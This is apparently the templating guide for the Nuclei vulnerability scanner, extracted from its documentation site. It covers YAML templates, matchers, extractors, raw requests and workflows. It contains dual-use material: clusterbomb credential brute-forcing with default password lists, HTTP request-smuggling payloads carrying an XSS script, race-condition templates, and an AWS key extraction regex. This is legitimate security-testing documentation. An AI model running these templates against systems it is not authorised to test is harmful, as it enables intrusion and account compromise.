Tip httpx can be used to generate URLs from subdomains as a input for nuclei. Rate Limits \u00b6 Nuclei have multiple rate limit controls for multiple factors including a number of templates to execute in parallel, a number of hosts to be scanned in parallel for each template, and the global number of request / per second you wanted to make/limit using nuclei, here is an example of each flags with description. Flag Description rate-limit Control the total number of request to send per seconds bulk-size Control the number of hosts to process in parallel for each template c Control the number of templates to process in parallel Feel free to play with these flags to tune your nuclei scan speed and accuracy. Tip rate-limit flag takes precedence over other two flag, number of request/seconds can't go beyond the value defined for rate-limit flag regardless the value of c and bulk-size flag. Template Exclusion \u00b6 Since release of nuclei v2.1.1 , Nuclei got support of .nuclei-ignore file that works along with update-templates flag of nuclei, in .nuclei-ignore file, you can define all the template directory or template path that you wanted to exclude from all nuclei scans. Here is the default list of nuclei-ignore file that gets downloaded along with template download/update using update-templates flag and exclude the listed templates and directory from execution. Warning .nuclei-ignore works only when templates are downloaded using update-templates flag. You can always add, update and remove entires from .nuclei-ignore file using any preferred text editor from following location, Why nuclei-ignore? To ensure nuclei is not getting used to hammer the web servers with templates that are meant to be used for specific use cases, including workflows, templates templates and more, templates that has severe impact, e.g DOS. Nuclei also supports template exclusion at run time using exclude flag, exclude flag works in similar manner as t flag, single or multiple template files or directory can be provided using exclude flag multiple times.

This allows easy extensibility capabilities to nuclei. The templates are written in YAML which specifies a simple human readable format to quickly define the execution process. Guide to write your own nuclei template - Let's start with the basics and define our own workflow file for detecting the presence of a .git/config file on a webserver and take it from there. Template Details \u00b6 Each template has a unique ID which is used during output writing to specify the template name for an output line. The template file ends with yaml extension. The template files can be created any text editor of your choice. # id contains the unique identifier for the template. id : git-config ID must not contain spaces. This is done to allow easier output parsing. Information \u00b6 Next important piece of information about a template is the info block. Info block provides more context on the purpose of the template and the author . It also contain severity field which indicates the severity of the template, info block supports dynamic fields, so one can define N number of key: value formatted fields to make template information more relevant for the checks you are writing. Let's add an info block to our template as well. info : # Name is the name of the template name : Git Config File Detection Template # Author is the name of the author for the template author : Ice3man # Severity is the severity for the check. severity : medium # Description optionally describes the template. description : Searches for the pattern /.git/config on passed URLs. # CVSS is impact score of the check. cvss : 4.6 Actual requests and corresponding matchers are placed below the info block and they perform the task of making requests to target servers and finding if the template request was successful. Each template file can contain multiple requests to be made. The template is iterated and one by one the desired HTTP/DNS requests are made to the target sites. HTTP Requests \u00b6 Requests start with a request block which specifies the start of the requests for the template. # Start the requests for the template right here requests : Method \u00b6 First thing in the request is method . Request method can be GET , POST , PUT , DELETE , etc depending on the needs. # Method is the method for the request method : GET Redirects \u00b6 Redirection conditions can be specified per each template. By default, redirects are not followed. However, if desired, they can be enabled with redirects: true in request details. 10 redirects are followed at maximum by default which should be good enough for most use cases. More fine grained control can be exercised over number of redirects followed by using max-redirects field. An example of the usage: requests : - method : GET path : - \"{{BaseURL}}/login.php\" redirects : true max-redirects : 3 Path \u00b6 The next part of the requests is the path of the request path. Dynamic variables can be placed in the path to modify its behavior on runtime. Variables start with {{ and end with }} and are case-sensitive. BaseURL - Placing BaseURL as a variable in the path will lead to it being replaced on runtime in the request by the original URL as specified in the target file. Hostname - Hostname variable is replaced by the hostname of the target on runtime. Some sample dynamic variable replacement examples: path : \"{{BaseURL}}/.git/config\" # This path will be replaced on execution with BaseURL # If BaseURL is set to https://abc.com then the # path will get replaced to the following: https://abc.com/.git/config Multiple paths can also be specified in one request which will be requested for the target. Headers \u00b6 Headers can also be specified to be sent along with the requests. Headers are placed in form of key/value pairs. An example header configuration looks like this: # headers contains the headers for the request headers : # Custom user-agent header User-Agent : Some-Random-User-Agent # Custom request origin Origin : https://google.com Body \u00b6 Body specifies a body to be sent along with the request. For instance: # Body is a string sent along with the request body : \"{\\\"some random JSON\\\"}\" # Body is a string sent along with the request body : \"admin=test\" Session \u00b6 To maintain cookie based browser like session between multiple requests, you can simply use cookie-reuse: true in your template, Useful in cases where you want to maintain session between series of request to complete the exploit chain and to perform authenticated scans. # cookie-reuse accepts boolean input and false as default cookie-reuse : true Matchers \u00b6 Matchers are the core of nuclei. They are what make the tool so powerful. Multiple type of combinations and checks can be added to ensure that the results you get are free from false-positives. Types \u00b6 Multiple matchers can be specified in a request. There are basically 6 types of matchers: Matcher Type Part Matched status Status Code of Response size Content Length of Response word Response body or headers regex Response body or headers binary Response body dsl All Response Parts To match status codes for responses, you can use the following syntax. matchers : # Match the status codes - type : status # Some status codes we want to match status : - 200 - 302 To match binary for hexadecimal responses, you can use the following syntax. matchers : - type : binary binary : - \"504B0304\" # zip archive - \"526172211A070100\" # rar RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition : or part : body To match size, similar structure can be followed. If the status code of response from the site matches any single one specified in the matcher, the request is marked as successful. Word and Regex matchers can be further configured depending on the needs of the users. Complex matchers of type dsl allows to build more elaborated expressions with helper functions, this is an example of a complex DSL matcher: matchers : - type : dsl dsl : - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Every part of a HTTP response can be matched with DSL matcher: Response Part Description Example content_length Content-Length Header content_length >= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw) This is the list for a DNS response supported by DSL matcher: Response Part Description Example rcode Response status rcode == \"NXDOMAIN question Response question section len(question) extra Response extra section len(extra) answer Response answers section len(answer) ns Response authority section len(ns) raw Full response len(raw) Conditions \u00b6 Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like AND and OR . AND - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched. OR - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher. Matched Parts \u00b6 Multiple parts of the response can also be matched for the request, default matched part is body if not defined. Part Matched Part body Body of the response header Header of the response all Both body and header of the response Example matchers for response body using the AND condition: matchers : # Match the body word - type : word # Some words we want to match words : - \"[core]\" - \"[config]\" # Both words must be found in the response body condition : and # We want to match request body (default) part : body Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility. Negative Matchers \u00b6 All types of matchers also support negative/opposite conditions, mostly useful when you looking to match with exclusions, it can be used by adding negative: true in the matchers block. Here is an example syntax using negative condition, this will return all the URLs not having PHPSESSID in the response header. matchers : - type : word words : - \"PHPSESSID\" part : header negative : true In same manner, negative condition can be used with single or multiple matchers. Multiple Matchers \u00b6 Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request. Here is an example of syntax for multiple matchers. matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" condition : or part : header Matchers Condition \u00b6 While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true. matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - \"PHP\" part : body Extractors \u00b6 Extractors are another important feature of nuclei. Extractors can be used to extract and display in results a match from the response body or headers based on available types. Types \u00b6 Multiple extractors can be specified in a request, as of now we support two type of extractors. Extractor Type Part Matched regex Response body or headers kval Response headers or cookie Example extractor for response body using regex, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor. - type : regex # part of the response to extract (can be headers, all too) part : body # regex to use for extraction. regex : - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" To extract key-value formatted data from the header, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor - type : kval part : header kval : # header value to extract from response - content-type To extract key-value formatted data from cookie, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor - type : kval kval : # cookie value to extract from response - PHPSESSID Matched Parts \u00b6 Multiple parts of the response can also be extracted for the request, default matched part is body if not defined. Part Matched Part body Body of the response header Header of the response all Both body and header of the response Note:- kval extractor only supported for header and cookies. Dynamic extractor \u00b6 Extractor plays an important role while writing an template for chained request which requires dynamic value to use at run time, for example CSRF tokens, headers or any values requires to complete the chain. Example of defining extractor as dynamic variable:- extractors : - type : regex name : api_key part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" Here we used extractor name as variable api_key which holds the value and can be reused in any part of the request dynamically, this feature is supported in RAW request format only. Note:- You can use internal: true when you only want to use extractor as dynamic variable, this will avoid printing extracted values in the terminal. Extraction of regex content can also be specific for matchgroups . # A list of extractors for text extraction extractors : # type of extractor - type : regex # Let's reuse the extracted CSRF token name : csrf_token part : body # group defines the matching group being used. # In GO the \"match\" is the full array of all matches and submatches # match[0] is the full match # match[n] is the submatches. Most often we'd want match[1] as depicted below group : 1 regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_token will hold the value extracted (by ([[:alnum:]]{16})) as abcdefgh12345678 . This is compared to not using the group variable. # A list of extractors for text extraction extractors : # type of extractor - type : regex # Let's reuse the extracted CSRF token name : csrf_html_tag part : body # No group here regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_html_tag will hold the full match (by <input name=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\" /> ) as <input name=\"csrf_token\" type=\"hidden\" value=\"abcdefgh12345678\" /> . Example HTTP Template \u00b6 The final template file for the .git/config file mentioned above is as follows: id : git-config info : name : Git Config File author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. requests : - method : GET path : - \"{{BaseURL}}/.git/config\" matchers : - type : word words : - \"[core]\" HTTP Raw requests \u00b6 Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones (as of now it's suggested to leave the Host header as in the example with the variable {{Hostname}} ), All the Matcher, Extractor capabilities can be used with RAW requests in same the way described above. requests : - raw : - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Length: 1 Origin: https://www.google.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Accept-Language: en-US,en;q=0.9 a=test&b=pd Requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. Here follows an example: Intruder payloads \u00b6 It's possible to define placeholders with simple keywords (or using brackets {{helper_function(variable)}} in case mutator functions are needed), and perform Sniper , Pitchfork and ClusterBomb attacks. The wordlist for these attacks needs to be defined during the request definition under the Payload field, with a name matching the keyword, Nuclei supports both file based and in template wordlist support and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values. Payloads are defined using variable name and can be referenced in the request between \u00a7 marker, for example \u00a7variable_name\u00a7 . An example of the using payloads with local wordlist: requests : # HTTP Intruder fuzzing using local wordlist. - payloads : parameter : params.txt header : local.txt An example of the using payloads with in template wordlist support: requests : # HTTP Intruder fuzzing using in template wordlist. requests : - payloads : password : - admin - guest - password - test - 12345 - 123456 Note:- be careful while selecting attack type, as unexpected input will break the template. For example, if you used clusterbomb or pitchfork as attack type and defined only one variable in the payload section, template will fail to compile, as clusterbomb or pitchfork expect more then one variable to use in the template. Intruder attack \u00b6 When using intruder, we support multiple attack types, including sniper which generally used to fuzz single parameter, clusterbomb and pitchfork for fuzzing multiple parameters which works same as classical burp intruder on CLI. Types of attack \u00b6 sniper pitchfork clusterbomb Sniper:- The sniper attack uses only one payload set, and it replaces only one position at a time. It loops through the payload set, first replacing only the first marked position with the payload and leaving all other positions to their original value. After its done with the first position, it continues with the second position. Pitchfork:- The pitchfork attack type uses one payload set for each position. It places the first payload in the first position, the second payload in the second position, and so on. It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on. Clusterbomb:- The cluster bomb attack tries all different combinations of payloads. It still puts the first payload in the first position, and the second payload in the second position. But when it loops through the payload sets, it tries all combinations. This attack type is useful for a brute-force attack. Load a list of commonly used usernames in the first payload set, and a list of commonly used passwords in the second payload set. The cluster bomb attack will then try all combinations. You can read more about attack types here . An example of the using using clusterbomb attack to fuzz. # Defining HTTP Intruder attack type attack : clusterbomb # Available attack types: sniper, pitchfork and clusterbomb RAW HTTP Support \u00b6 Nuclei also supports rawhttp for complete request control and customization allowing any kind of malformed requests checks for issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more, rawhttp library is disabled as default and can be used by including unsafe: true in the request block. Here is an example for HTTP request smuggling detection using rawhttp . requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 - | GET /post?postId=5 HTTP/1.1 Host: {{Hostname}} unsafe : true # enables rawhttp client matchers : - type : dsl dsl : - 'contains(body, \"<script>alert(1)</script>\")' Using rawhttp also enable automatic handling of host header and content-length header, to disable this behavior, disable-automatic-content-length-header and disable-automatic-host-header can be used in following manner. requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 unsafe : true # enables rawhttp client disable-automatic-content-length-header : true disable-automatic-host-header : true matchers : - type : dsl dsl : - 'contains(body, \"<script>alert(1)</script>\")' Helper functions \u00b6 Here is the list of all supported helper functions can be used in the RAW requests: Helper function Description Example len Length of a string len(\"Hello\") toupper String to uppercase toupper(\"Hello\") tolower String to lowercase tolower(\"Hello\") replace Replace string parts replace(\"Hello\", \"He\", \"Ha\") trim Remove trailing unicode chars trim(\"aaaHelloddd\", \"ad\") trimleft Remove unicode chars from left trimleft(\"aaaHelloddd\", \"ad\") trimright Remove unicode chars from right trimleft(\"aaaHelloddd\", \"ad\") trimspace Remove trailing spaces trimspace(\" Hello \") trimprefix Trim specified prefix trimprefix(\"aaHelloaa\", \"aa\") trimsuffix Trim specified suffix trimsuffix(\"aaHelloaa\", \"aa\") base64 Encode string to base64 base64(\"Hello\") base64_decode Decode string from base64 base64_decode(\"SGVsbG8=\") url_encode URL encode a string url_encode(\"hxxps://projectdiscovery.io/test?a=1\") url_decode URL decode a string url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\") hex_encode Hex encode a string hex_encode(\"aa\") hex_decode Hex decode a string hex_decode(\"6161\") html_escape Hex encode a string html_escape(\" test \") html_unescape Hex decode a string html_unescape(\"<body>test</body>\") md5 Calculate md5 of string md5(\"Hello\") sha256 Calculate sha256 of string sha256(\"Hello\") sha1 Calculate sha1 of string sha1(\"Hello\") contains Verify if a string contains another one contains(\"Hello\", \"lo\") regex Verify a regex versus a string regex(\"H([a-z]+)o\", \"Hello\") An example of the using helper function in the header. raw : # Request with simple header manipulation with DSL functions - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 Connection: close Example RAW Template \u00b6 id : http-raw-request info : name : Example-Fuzzing requests : - payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Supported attack types: sniper, pitchfork and clusterbomb raw : # Request with simple header manipulation with DSL functions - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64(username + ':' + password)}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 Connection: close matchers : - type : status status : - 200 DNS Requests \u00b6 Requests start with a dns block which specifies the start of the requests for the template. # Start the requests for the template right here dns : DNS requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. Type \u00b6 First thing in the request is type . Request type can be A , NS , CNAME , SOA , PTR , MX , TXT , AAAA . # type is the type for the dns request type : A Name \u00b6 The next part of the requests is the name of the request path. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. FQDN - variable is replaced by the hostname/FQDN of the target on runtime. Some sample dynamic variable replacement examples: name : {{ FQDN }} .com # This value will be replaced on execution with the FQDN. # If FQDN is https://this.is.an.example then the # name will get replaced to the following: this.is.an.example.com As of now the tool supports only one question per request. Class \u00b6 Class type can be INET , CSNET , CHAOS , HESIOD , NONE and ANY . Usually it's enough to just leave it as INET . # method is the class for the dns request class : inet Recursion \u00b6 Recursion is a boolean value, and determines if the resolver should only return cached results, or traverse the whole dns root tree to retrieve fresh results. Generally it's better to leave it as true . # Recursion is a boolean determining if the request is recursive recursion : true Retries \u00b6 Retries is the number of attempts a dns query is retried before giving up among different resolvers. It's recommended a reasonable value, like 3 . # Retries is a number of retries before giving up on dns resolution retries : 3 Matchers \u00b6 Matchers are just equal to HTTP, but the search is performed on the whole dns response, therefore it's not necessary to specify the part . Multiple type of combinations and checks can be added to ensure that the results you get are free from false positives. The complex dsl matcher type allows to build complex queries as described in the HTTP section. Types \u00b6 Multiple matchers can be specified in a request. There are basically 3 types of matchers: Matcher Type Part Matched word DNS Response regex DNS Response dsl DNS Response Example DNS Template \u00b6 The final example template file for performing A query, and check if CNAME and A records are in the response is as follows: id : dummy-cname-a info : name : Dummy A dns request author : mzack9999 severity : none description : Checks if CNAME and A record is returned. dns : - name : \"{{FQDN}}\" type : A class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition : and Workflows \u00b6 Workflows are powerful utility of nuclei and most efficient way to use nuclei templates where all the templates can be configured based on specific needs of users, one can configure a workflow in a way that ensures / control complete nuclei templates checks from a single workflow, the use cases varies depending upon the users needs. Tengo , a scripting engine is used as a base for nuclei workflows which provides a very powerful and highly customizable engine for users to automate all their needs. Workflows can be defined with workflows attribute, following the template or subtemplates to executes, and we can write two type of workflows. # Workflows starts form this block. workflows : - template : technologies/template-to-execute.yaml Type of workflows Generic workflows Conditional workflows Generic Workflows \u00b6 In generic workflow one can define a single or multiple template executions from a single workflow, it can be list of specific templates or list of directory containing multiple templates. For example:- # A workflow that runs all config related templates on the list of give URLs. workflows : - template : files/git-config.yaml - template : files/svn-config.yaml - template : files/env-file.yaml - template : files/backup-files.yaml # A workflow that runs specific list of checks defined for your project. workflows : - template : cves/ - template : exposed-tokens/ - template : exposures/ Conditional Workflows \u00b6 You can also create conditional templates which executes after matching the condition from the previous templates, mostly useful for vulnerability detection and exploitation and tech based detection and exploitation, single, multiple along with directory based templates can be executed in chained workflow template. Templates based conditional check For example:- # A workflow that executes subtemplates when base template gets matched. workflows : - template : technologies/jira-detect.yaml subtemplates : - template : exploits/jira-exploit-1.yaml - template : exploits/jira-exploit-1.yaml Templates and matcher name based conditional check For example:- # A workflow that executes subtemplates when a matcher of base template gets matched. workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - template : exploits/vbulletin-exp1.yaml - template : exploits/vbulletin-exp2.yaml - name : jboss subtemplates : - template : exploits/jboss-exp1.yaml - template : exploits/jboss-exp2.yaml In similar manner, one can create as much conditions you want to execute specific templates based on certain conditions. Templates and matcher name based multi level conditional check For example:- # A workflow showcasing chain of template executions that runs only if the previous templates get matched. workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml Conditional workflows are great examples of performing checks and vulnerability detection in most efficient manner instead of spraying all the templates on your all the targets, and generally comes of with good ROI of your time and good for the target projects and websites as well. Advance Fuzzing \u00b6 We\u2019ve enriched nuclei to allow advanced fuzzing of web servers. Users can now use multiple options to tune HTTP fuzzing workflows. HTTP Pipelining \u00b6 HTTP Pipelining support has been added which allows multiple HTTP requests to be sent on the same connection inspired from http-desync-attacks-request-smuggling-reborn . Before running HTTP pipelining based templates, make sure the running target supports HTTP Pipeline connection, otherwise nuclei engine fallback to stranded HTTP request. If you wanted to confirm the given domain or list of subdomains supports HTTP Pipelining? httpx has a flag -pipeline to probe it. An example configuring pipelining attributes of nuclei template. unsafe : true pipeline : true pipeline-max-connections : 40 pipeline-max-workers : 25000 An example template demonstrating pipelining capabilities of nuclei has been provided below- id : pipeline-testing info : name : pipeline testing author : pdteam severity : info requests : - payloads : path : path_wordlist.txt attack : sniper unsafe : true pipeline : true pipeline-max-connections : 40 pipeline-max-workers : 25000 raw : - | GET /\u00a7path\u00a7 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Referer: {{BaseURL}} Connection: keep-alive matchers : - type : status part : header status : - 200 HTTP Connection pooling \u00b6 While the earlier versions of nuclei did not do connection pooling, users can now configure templates to either use HTTP connection pooling or not. This allows for faster scanning based on requirement. To enable connection pooling in the template, threads attribute can be defined with respective number of threads you wanted to use in the payloads sections. Connection: Close header can not be used in HTTP connection pooling template, otherwise engine will fail and fallback to standard HTTP requests. An example template using HTTP connection pooling- id : fuzzing-example info : name : Connection pooling example author : pdteam severity : info requests : - payloads : password : password.txt threads : 40 attack : sniper raw : - | GET /protected HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('admin:\u00a7password\u00a7')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 matchers-condition : and matchers : - type : status status : - 200 - type : word words : - \"Unique string\" part : body HTTP Smuggling \u00b6 HTTP Smuggling is a class of Web-Attacks recently made popular by Portswigger\u2019s Research into the topic. For an in-depth overview, please visit the article linked above. In the open source space, detecting http smuggling is difficult particularly due to the requests for detection being malformed by nature. Nuclei is able to reliably detect HTTP Smuggling vulnerabilities utilising the rawhttp engine. The most basic example of a HTTP Smuggling vulnerability is CL.TE Smuggling. An example template to detect a CE.TL HTTP Smuggling vulnerability is provided below using the unsafe: true attribute for rawhttp based requests. id : CL.TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - | POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : word words : - 'Unrecognized method GPOST' More examples are available in template-examples section for smuggling templates. Race conditions \u00b6 Race Conditions are another class of bugs not easily automated via traditional tooling. Burp Suite introduced a Gate mechanism to Turbo Intruder where all the bytes for all the requests are sent expect the last one at once which is only sent together for all requests synchronizing the send event. We have implemented Gate mechanism in nuclei engine and allow them run via templates which makes the testing for this specfic bug class simple and portable. To enable race condition check within template, race attribute can be set to true and race_count defines the number of simultaneous request you want to initiate. Below is an example template where the same request is repeated for 10 times using the gate logic. id : race-condition-testing info : name : Race condition testing author : pdteam severity : info requests : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 You can simply replace the POST request with any suspected vulnerable request and change the race_count as per your need and it's ready to run. nuclei -t race.yaml -target https://api.target.com Multi request race condition testing For the scenario when multiple requests needs to be sent in order to exploit the race condition, we can make use of threads. threads : 5 race : true threads is a total number of request you wanted make with the template to perform race condition testing. Below is an example template where multiple (5) unique request will be sent at the same time using the gate logic. id : multi-request-race info : name : Race condition testing with multiple requests author : pd-team severity : info requests : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true The best part of this is you can simply share your crafted template with your team mates, triage/security team to replicate the issue on the other side with ease.","title":"Templating Guide"},{"location":"templating-guide/#templating-guide","text":"Nuclei is based on the concepts of YAML based template files that define how the requests will be sent and processed.
